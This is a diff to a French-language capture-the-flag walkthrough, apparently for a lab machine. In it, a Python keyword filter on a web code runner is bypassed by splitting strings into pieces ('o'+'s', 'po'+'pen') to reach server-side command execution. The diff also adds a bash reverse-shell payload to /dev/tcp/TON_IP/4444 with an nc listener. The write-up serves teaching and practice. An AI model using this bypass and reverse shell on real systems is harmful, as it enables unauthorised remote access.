@@ -486,7 +486,7 @@ En revanche, l’exécution via **Run** constitue un point d’entrée direct ve
 
 En testant différentes instructions Python, tu observes rapidement que certaines commandes sont bloquées avec le message :
 
-```
+```text
 Use of restricted keywords is not allowed.
 ```
 
@@ -510,7 +510,7 @@ Le chemin logique devient donc :
 
 L’objectif devient alors de comprendre ce qui est filtré, et surtout comment contourner ces restrictions.
 
-Plutôt que d’importer directement des modules (ce qui est bloqué), tu explores l’environnement Python déjà chargé en mémoire via `globals()` :
+Plutôt que d’importer directement des modules — ce qui est bloqué — tu explores l’environnement Python déjà chargé en mémoire via `globals()` :
 
 ```python
 print(globals().keys())
@@ -520,37 +520,59 @@ Cette approche permet d’identifier les objets accessibles sans passer par un `
 
 Tu constates notamment la présence du module `os`, ce qui ouvre la voie à une exécution de commandes système.
 
-Une tentative directe échoue :
+Une première tentative consiste à appeler directement ce module :
 
 ```python
-import os
-os.popen("id").read()
+m = globals()['os']
+m.popen("id").read()
 ```
 
-Le filtrage bloque :
+Cette commande échoue avec le message :
 
-- `os`
-- `popen`
-
-Tu passes alors à une approche classique de contournement en reconstruction dynamique des chaînes :
-
+```text
+Use of restricted keywords is not allowed.
 ```
+
+Tu en déduis qu’au moins certains éléments utilisés dans cette instruction sont filtrés.
+
+Tu commences alors à contourner progressivement ces restrictions.
+
+D’abord, tu reconstruis dynamiquement le nom du module :
+
+```python
 m = globals()['o'+'s']
-p = getattr(m, 'po'+'pen')('id')
+m.popen("id").read()
+```
+
+Le filtrage est toujours présent.
+
+Tu appliques ensuite la même logique à `popen` :
+
+```python
+m = globals()['o'+'s']
+p = getattr(m, 'po'+'pen')("id")
+p.read()
+```
+
+Le blocage persiste.
+
+Enfin, tu contournes également `read` :
+
+```python
+m = globals()['o'+'s']
+p = getattr(m, 'po'+'pen')("id")
 print(getattr(p, 're'+'ad')())
 ```
 
-Cette technique permet de :
+Cette fois, la commande s’exécute correctement et le résultat de `id` s’affiche.
 
-- éviter les mots-clés filtrés (`os`, `popen`, `read`)
-- accéder dynamiquement aux fonctions sensibles
-- exécuter une commande système
+Cette progression permet de comprendre que le filtrage repose sur des correspondances de chaînes, et qu’il peut être contourné en reconstruisant dynamiquement les éléments sensibles.
 
-Le résultat de la commande `id` s’affiche correctement, ce qui confirme que :
+Tu confirmes ainsi que :
 
 - le code est exécuté côté serveur
 - l’accès au système est possible
-- le filtrage est uniquement basé sur des mots-clés
+- le filtrage est contournable
 
 Tu disposes donc d’une **RCE (Remote Code Execution)** exploitable.
 
@@ -560,23 +582,31 @@ Tu disposes donc d’une **RCE (Remote Code Execution)** exploitable.
 
 Une fois la RCE confirmée, l’objectif est d’obtenir un accès interactif à la machine.
 
-Tu remplaces la commande utilisée précédemment par un reverse shell :
+Tu adaptes le payload précédent pour lancer un reverse shell :
 
-```
+```python
 m = globals()['o'+'s']
 p = getattr(m, 'po'+'pen')("bash -c 'bash -i >& /dev/tcp/TON_IP/4444 0>&1'")
 print(getattr(p, 're'+'ad')())
 ```
 
-Sur ta machine Kali, tu démarres un listener :
+Avant d’exécuter ce code, tu démarres un listener sur ta machine Kali :
 
-```
-rlwrap -cAr nc -lvnp 4444
+```bash
+nc -lvnp 4444
 ```
 
 Dès l’exécution du code via le bouton **Run**, la machine cible initie une connexion vers ton listener.
 
 Tu obtiens ainsi un shell sur le système distant.
+
+Une stabilisation du shell est nécessaire pour poursuivre l’exploitation dans de bonnes conditions.
+
+Tu appliques alors la procédure standard décrite dans la recette dédiée :
+
+{{< recette "stabiliser-reverse-shell" >}}
+
+
 
 
 
